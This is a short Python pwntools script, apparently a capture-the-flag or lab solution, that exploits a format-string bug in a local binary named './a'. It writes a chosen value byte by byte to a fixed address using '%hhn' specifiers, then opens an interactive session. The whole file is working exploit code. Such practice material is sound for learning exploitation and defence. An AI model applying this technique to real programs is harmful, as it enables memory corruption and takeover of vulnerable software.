#!/usr/bin/env python
from pwn import *
p = process('./a')
offset = 6
x_addr = 0x0804a028
target_val = 0x12345678
payload = ''.join(p32(x_addr + i) for i in range(4))
fmt_str = '%{}c%{}$hhn'
length = len(payload)
for i in range(4):
	byte = (target_val >> (8 * i)) & 0xff
	print 'byte{}:'.format(i), hex(byte)
	addition = (byte - length + 256) % 256
	print 'addition:', addition
	if addition < 0 or addition > 255:
		assert(False)
	payload += fmt_str.format(str(addition), str(offset + i))
	length += addition
print 'payload:', payload
p.sendline(payload)
p.interactive()
